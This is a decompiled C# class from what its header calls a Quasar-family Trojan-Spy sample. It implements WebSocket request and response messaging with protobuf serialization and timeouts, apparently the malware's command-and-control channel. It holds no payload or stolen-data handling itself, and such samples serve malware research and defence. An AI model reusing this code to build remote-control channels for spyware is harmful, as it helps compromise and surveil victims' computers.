// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.Srv.JJo
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models;
using NoiseMe.Drags.App.Models.Communication;
using NoiseMe.Drags.App.Models.LocalModels.Extensions;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using NoiseMe.Drags.App.Models.WebSocket4Net;
using System;
using System.Threading;

namespace NoiseMe.Drags.App.Data.Srv
{
  public static class JJo
  {
    public static hd OnResponseRecieved;

    public static bool? OnResponse(this ResponseBase response)
    {
      hd responseRecieved = JJo.OnResponseRecieved;
      return responseRecieved == null ? new bool?() : new bool?(responseRecieved(response));
    }

    public static AsyncAction ProcessResponse<TInput>(
      this RequestBase request,
      WebSocket session,
      TInput objectToSend)
    {
      return AsyncTask.StartNew((AsyncAction) (() =>
      {
        byte[] data = request.CreateResponse<TInput>(objectToSend).SerializeProto<Response<TInput>>();
        session.Send(data, 0, data.Length);
      }));
    }

    public static AsyncAction ProcessRequest<TInput>(
      this WebSocket session,
      TInput objectToSend,
      string Name)
    {
      return AsyncTask.StartNew((AsyncAction) (() =>
      {
        byte[] data = new Request<TInput>(objectToSend, Name).SerializeProto<Request<TInput>>();
        session.Send(data, 0, data.Length);
      }));
    }

    public static TaskAction<TResult> ProcessRequest<TInput, TResult>(
      this WebSocket session,
      TInput objectToSend,
      string Name,
      int timeoutMilliseconds = 60000)
    {
      return AsyncTask.StartNew<TResult>((TaskAction<TResult>) (() =>
      {
        try
        {
          DateTime dateTime = DateTime.Now.AddMilliseconds((double) timeoutMilliseconds);
          Request<TInput> localRequest = new Request<TInput>(objectToSend, Name);
          bool handled = false;
          TResult result = default (TResult);
          JJo.OnResponseRecieved += new hd(OnResponse);
          byte[] data = localRequest.SerializeProto<Request<TInput>>();
          session.Send(data, 0, data.Length);
          while (dateTime >= DateTime.Now && !handled)
            Thread.Sleep(100);
          JJo.OnResponseRecieved -= new hd(OnResponse);
          return result;

          bool OnResponse(ResponseBase response)
          {
            if (!response.IsNotNull<ResponseBase>() || !response.ID.IsNotNull<string>() || !(response.ID == localRequest.ID))
              return false;
            result = ((Response<TResult>) response).Body;
            handled = true;
            return true;
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
          return default (TResult);
        }
      }));
    }
  }
}
